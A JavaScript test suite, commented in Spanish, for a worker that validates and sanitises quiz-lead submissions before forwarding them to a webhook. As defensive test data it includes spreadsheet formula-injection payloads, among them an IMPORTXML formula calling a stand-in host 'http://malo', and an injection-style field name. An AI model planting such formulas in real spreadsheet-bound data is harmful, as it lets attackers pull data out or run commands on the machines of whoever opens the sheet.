import assert from "node:assert/strict";
import worker, { limpiar, validar, sanear } from "../src/index.js";

const ORIGEN = "https://diagnostico.anwarsepulveda.com";
let enviado = null;
globalThis.fetch = async (url, o) => { enviado = { url, body: JSON.parse(o.body), key: o.headers["x-make-apikey"] }; return { ok: true, status: 200 }; };
const env = { MAKE_URL: "https://make.test/hook", MAKE_KEY: "LLAVE", LIMITE: { limit: async () => ({ success: true }) } };
const post = (body, origin = ORIGEN, method = "POST") =>
  worker.fetch(new Request("https://dx-entrada.test/", { method, headers: { Origin: origin, "Content-Type": "application/json" }, body: (body == null || method === "GET") ? undefined : (typeof body === "string" ? body : JSON.stringify(body)) }), env);

const lead = { action: "quiz_complete", nombre: "Ana López", email: "ana@negocio.mx", etapa: 3,
  b1_presupuesto: 2, b2_campanas: 4, b3_equipo: 1, b4_metricas: 3, b5_automatizacion: 2, b6_ventas: 4, b7_oferta: 1, b8_cliente: 2, b9_respuesta: 3, b10_creatividades: 4,
  utm_source: "meta", utm_content: "C1.1.3", vid: "abc", results_url: "https://diagnostico.anwarsepulveda.com/?r=xyz&e=ana%40negocio.mx&n=Ana" };

let t = 0; const ok = (m) => { t++; console.log("✓", m); };

// 1 lead real pasa intacto y con llave
let r = await post(lead); assert.equal(r.status, 200); assert.equal(enviado.key, "LLAVE");
assert.equal(enviado.body.nombre, "Ana López"); assert.equal(enviado.body.b2_campanas, 4); assert.equal(enviado.body.results_url, lead.results_url); ok("lead real pasa intacto, con llave");
// 2 fórmulas neutralizadas
r = await post({ ...lead, nombre: "=IMPORTXML(\"http://malo\";\"//a\")", c1_rubro: "+1+1", c2_modelo: "@cmd", c3_costo: "-2" });
assert.equal(enviado.body.nombre[0], "'"); assert.equal(enviado.body.c1_rubro, "'+1+1"); assert.equal(enviado.body.c2_modelo, "'@cmd"); assert.equal(enviado.body.c3_costo, "'-2"); ok("fórmulas = + - @ neutralizadas");
// 3 número negativo legítimo no se rompe (llega como número)
assert.equal(limpiar(-2), -2); ok("números siguen siendo números");
// 4 rechazos
assert.equal((await post(lead, "https://otro.com")).status, 403); ok("otro origen: 403");
assert.equal((await post(lead, ORIGEN, "GET")).status, 405); ok("GET: 405");
assert.equal((await post("{no json")).status, 400); ok("json roto: 400");
assert.equal((await post({ ...lead, action: "borrar_todo" })).status, 422); ok("action desconocida: 422");
assert.equal((await post({ ...lead, email: "no-es-correo" })).status, 422); ok("correo inválido: 422");
assert.equal((await post({ ...lead, b3_equipo: 9 })).status, 422); ok("respuesta 9: 422");
assert.equal((await post({ ...lead, extra: { anidado: 1 } })).status, 422); ok("objeto anidado: 422");
const gordo = { ...lead }; for (let i = 0; i < 70; i++) gordo["x" + i] = i; assert.equal((await post(gordo)).status, 422); ok("70 campos: 422");
// 5 texto largo se recorta a 500
await post({ ...lead, c4_traba: "a".repeat(5000) }); assert.equal(enviado.body.c4_traba.length, 500); ok("texto de 5000 → 500");
// 6 límite por IP
const env429 = { ...env, LIMITE: { limit: async () => ({ success: false }) } };
r = await worker.fetch(new Request("https://x/", { method: "POST", headers: { Origin: ORIGEN }, body: JSON.stringify(lead) }), env429); assert.equal(r.status, 429); ok("límite por IP: 429");
// 7 preflight
r = await post(null, ORIGEN, "OPTIONS"); assert.equal(r.status, 204); assert.equal(r.headers.get("Access-Control-Allow-Origin"), ORIGEN); ok("OPTIONS: 204 con CORS");
// 8 Make caído → 502 (la página sigue igual: fire and forget)
globalThis.fetch = async () => ({ ok: false, status: 500 }); r = await post(lead); assert.equal(r.status, 502); ok("Make caído: 502");
// 9 llaves raras se tiran
assert.deepEqual(Object.keys(sanear({ action: "x", "nombre; drop": 1, "a.b": 2, ok_1: 3 })), ["action", "ok_1"]); ok("llaves raras fuera");
console.log(`\n${t}/${t} pruebas pasan`);
